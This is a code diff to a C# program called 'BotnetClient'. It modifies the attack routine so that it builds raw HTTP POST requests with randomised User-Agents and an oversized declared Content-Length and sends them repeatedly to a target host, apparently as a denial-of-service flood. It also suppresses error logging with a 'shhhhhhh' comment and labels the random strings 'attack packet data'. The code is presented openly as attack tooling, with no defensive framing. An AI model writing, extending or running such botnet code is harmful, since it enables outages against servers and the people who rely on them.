@@ -242,7 +242,7 @@ namespace BotnetClient
                     }
                     catch (SocketException se)
                     {
-                        log("SocketException : " + se.ToString());
+                        //log("SocketException : " + se.ToString()); shhhhhhh
                     }
                     catch (Exception e)
                     {
@@ -349,11 +349,14 @@ namespace BotnetClient
                         Byte[] data = Encoding.ASCII.GetBytes(message);
                         try
                         {
-                            stream.Write(data, 0, data.Length);
+                            string post = $"POST / HTTP/1.1\r\nHost: " + HostOrIP.Trim() + " \r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: {" + UserAgents[new Random().Next(UserAgents.Length)] + "}\r\nContent-length: 5235\r\n\r\n";
+                            byte[] buffer = Encoding.UTF8.GetBytes(post);
+                            client.Client.Send(buffer, 0, buffer.Length, SocketFlags.None);
+                            log($"Packet has been sent [{DateTime.Now.ToLongTimeString()}]");
                         }
                         catch (Exception e)
                         {
-                            log("Problem sending packet on thread " + connection.guid + "... closing...");
+                            log("Problem sending packet: " + e.ToString());
                             stream.Close();
                             client.Close();
                             client.Dispose();
@@ -443,7 +446,12 @@ namespace BotnetClient
                 MessageBox.Show(logListView.SelectedItems[0].Text, "Log Message");
             }
         }
-        // Random string generator
+
+        /// <summary>
+        /// Random string generator, generates string of specified length (packet size) for attack packet data
+        /// </summary>
+        /// <param name="length"></param>
+        /// <returns></returns>
         public static string RandomString(int length)
         {
             const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
